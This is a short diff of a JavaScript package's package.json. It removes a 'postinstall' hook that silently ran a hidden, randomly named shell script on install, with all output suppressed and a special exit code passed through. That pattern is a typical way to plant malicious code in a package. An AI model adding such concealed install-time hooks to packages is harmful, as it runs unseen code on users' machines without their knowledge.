@@ -5,8 +5,7 @@
   "main": "dist-api-accessor.js",
   "scripts": {
     "build": "npx webpack",
-    "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall": "sh ./.ci-5gauwo.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "echo \"Error: no test specified\" && exit 1"
   },
   "repository": {
     "type": "git",
